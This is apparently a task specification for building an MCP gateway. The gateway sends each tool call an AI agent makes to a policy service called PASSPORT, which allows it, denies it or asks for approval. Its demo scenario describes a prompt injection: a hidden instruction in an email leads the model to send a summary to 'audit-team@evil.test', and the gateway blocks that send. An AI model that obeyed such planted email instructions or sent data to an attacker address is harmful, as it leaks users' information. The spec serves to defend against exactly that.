Slice V2-E: MCP gateway (replaces V2-D). Person B. Start by 04:00 at the latest; if it isn't working by 08:00, cut it and mention it as future work. Use verify-before-use for `fastmcp` (standalone package; server, client, error and elicitation APIs change between versions; read the installed version's docs before writing code). Plan first, wait for my OK.

## Why
The problem statement lists "MCP gateway" as an optional extension, and judges last time asked "how does it connect to other software?". Today PASSPORT protects our own agent loop and anyone who calls `POST /v1/decide`. With a gateway, any MCP client (Claude Desktop, Cursor, VS Code, the MCP Inspector) gets the same checks, without changes to the client or the model. All data stays synthetic: the gateway serves our simulated World, never real accounts.

## Example (must work exactly like this)
Gateway started with `PASSPORT_INBOX=s2_hidden_instruction`. In Claude Desktop: "Summarise my unread emails and reply to Asha with the summary."
1. The client calls `start_task` with that request → intent locked.
2. `list_unread_emails` → ALLOW; output returned, labelled untrusted context for later calls.
3. The model, following the hidden instruction, calls `send_email(to="audit-team@evil.test", ...)` → **DENY**. The client sees an error with the rule id, the reason and the line of the email the address came from.
4. `send_email(to=<Asha's address>, ...)` → ALLOW, sent in the simulated World.
Stop the backend and call any tool → **DENY "PASSPORT unreachable, failing closed"**. The tool never runs.

## Build (new folder `integrations/mcp_gateway/`, don't touch backend/app/)
1. `server.py`: a FastMCP server. One MCP tool per entry in `backend/app/tools/registry.py` TOOLS (same names, params and descriptions), plus `start_task(request: str)`. Import `World`, `TOOLS`, `validate_args` and `run_tool` from the backend read-only (`PYTHONPATH=backend`). One `World(inbox=PASSPORT_INBOX)` per gateway process.
2. Intent: `start_task` stores the user request. The first call wins: a second call is refused ("intent is locked for this session"), so injected content can't rewrite the task. Any other tool called before `start_task` → refused, fail closed. Say honestly in the README that in MCP the gateway sees the request as the client reports it.
3. Every tool call: `validate_args` (bad args → refused with the error), then `POST {PASSPORT_URL}/v1/decide` with `tool`, `args`, `user_request` and `context` = every earlier tool output in this session, each with `source` = "<tool> #<n>" and `trust` = that tool's `output_trust` (untrusted / trusted / secret; trim to the API limits: 50 items, 20,000 chars each, keep the newest). Send `X-Demo-Code` if `PASSPORT_DEMO_CODE` is set. httpx timeout 5 s.
4. Verdicts:
   - ALLOW → `run_tool`, return the output as JSON text, append it to the session context.
   - DENY → MCP tool error: `PASSPORT DENY <rule_id>: <message>` plus the evidence (`where` line) from the decision. The tool does not run.
   - REQUIRE_APPROVAL → if the installed fastmcp and the client support elicitation, ask the user "Approve <tool>(<args>)? Reason: …" and run only on an explicit yes. Otherwise (or on no / timeout / error) refuse with "needs human approval; refused (fail closed)".
   - Backend unreachable, timeout, non-200, or an unparseable response → DENY "PASSPORT unreachable, failing closed".
5. Transports: stdio by default (Claude Desktop); `--http --port 8765` for streamable HTTP (MCP Inspector, or ChatGPT through a tunnel as a bonus only).
6. Logging: one line per call to stderr (tool, verdict, rule_id), never to stdout (stdout is the stdio protocol). Never log secret values. The backend already writes the `v1_decide` audit event, so the Audit tab shows gateway calls too.
7. `requirements.txt` in the folder (pinned fastmcp + httpx), kept out of the backend requirements.
8. `README.md`: what it is, setup, the Claude Desktop config JSON (stdio command with `PYTHONPATH`, `PASSPORT_URL`, `PASSPORT_INBOX`), how to run the MCP Inspector, the example above as a demo script, and limits (protects only tools exposed through the gateway; the intent comes from the client).
9. Tests `integrations/mcp_gateway/tests/test_gateway.py`, using the fastmcp in-memory client with `/v1/decide` served by the backend app through httpx's ASGI transport (no network): the s2 example (ALLOW read, DENY attacker send, ALLOW legit send); tool before `start_task` refused; second `start_task` refused; backend down → DENY and the tool didn't run (World unchanged); REQUIRE_APPROVAL with no elicitation → refused; invalid args → refused; a secret read earlier is sent as `trust: secret` and an exfil attempt is DENY.
10. Makefile: a `mcp-gateway` target (run over stdio) and a `mcp-test` target. Leave `make check` as is unless the tests run in under 10 s with no extra install.

Docs: DECISIONS.md (fastmcp version, how the intent lock works, approval behaviour), ARCHITECTURE.md (one paragraph + where the gateway sits), PITCH.md (one line + Q&A "Does it work with real agents?"), THREAT-MODEL.md (what the gateway doesn't stop: tools the client reaches some other way). Acceptance: V2-E lines in docs/ACCEPTANCE.md. `make check` green.

Don't touch backend/app/ or frontend/. If `/v1/decide` needs a change, stop and ask Person A.
